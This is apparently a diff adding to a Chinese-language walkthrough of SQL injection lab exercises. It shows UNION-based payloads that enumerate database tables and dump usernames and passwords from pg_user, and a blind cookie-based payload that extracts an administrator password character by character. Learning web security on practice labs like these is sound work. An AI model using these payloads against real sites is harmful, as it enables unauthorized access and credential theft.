@@ -268,3 +268,73 @@ MyDatabase     dbo           Users       Password     varchar
 
 来到这一关
 
+```
+Pets' union select 'bbbbbbbbbbbbb','aaaaaaaaaaaaaaaaa'--+
+```
+
+![image-20250627182605974](assets/image-20250627182605974.png)
+
+在回显位判断一下数据库
+
+```
+Pets' union select version(),'aaaaaaaaaaaaaaaaa'--+
+```
+
+![image-20250627182838518](assets/image-20250627182838518.png)
+
+```
+Pets' union select 'aaaaaaaaaaaaaaaaa',TABLE_NAME from information_schema.tables--+
+```
+
+搜出180条：
+
+![image-20250627183219016](assets/image-20250627183219016.png)
+
+从中找到了一个叫pg_user的表
+
+```
+Pets' union select 'aaaaaaaaaaaaaaaaa',COLUMN_NAME from information_schema.columns where table_name = 'pg_user'--+
+```
+
+其中有usename和passwd的列
+
+```
+Pets' union select usename, passwd from pg_user--+
+```
+
+没找到administrator用户
+
+
+
+## 8、Blind SQL injection with conditional responses
+
+```
+SELECT SUBSTRING('Hello World', 2, 4);
+```
+
+`2` 是起始位置，意味着从第二个字符开始提取（字符串的第一个字符的位置是1 不是0），`4` 表示要提取的字符数量，所以结果是`ello`
+
+题中说：该应用程序使用跟踪 Cookie 进行分析，并执行包含已提交 Cookie 值的 SQL 查询。
+
+例如Cookie的内容是：`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
+
+应用程序使用 SQL 查询来确定这是否是已知用户：
+
+```
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+```
+
+本关的pyload：
+
+```
+i6xQwpnJkSS7hUrN' and substring((select password from users where username = 'administrator'),1,1)='s'--+
+```
+
+即更改请求包的Cookie字段：
+
+```
+Cookie: TrackingId=i6xQwpnJkSS7hUrN'%20and%20substring((select%20password%20from%20users%20where%20username%20=%20'administrator'),1,1)='s'--+;
+```
+
+如果正确，页面中会返回一个Welcome back，否则不返回Welcome back
+
